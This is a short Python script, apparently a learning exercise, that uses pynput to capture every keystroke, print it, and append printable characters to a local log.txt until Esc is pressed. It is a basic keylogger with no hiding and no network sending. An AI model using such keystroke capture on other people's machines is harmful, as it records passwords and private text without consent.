from pynput.keyboard import Key, Listener

count = 0
keys = []

def pressed_key(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            try:
                # Checks whether the key is a single character.
                k = key.char if hasattr(key, 'char') else str(key)

                if k == 'None':  # ignore keys like shift, tab, ctrl
                    continue
                if k == 'Key.space':  # If the space key is pressed, it prints a new line
                    f.write('\n')
                elif 'Key' not in k: 
                    f.write(k)
            except Exception as e:
                print(f"Erro ao processar tecla: {e}")

def released_key(key):
    if key == Key.esc:
        return False

with Listener(on_press=pressed_key, on_release=released_key) as listener:
    listener.join()
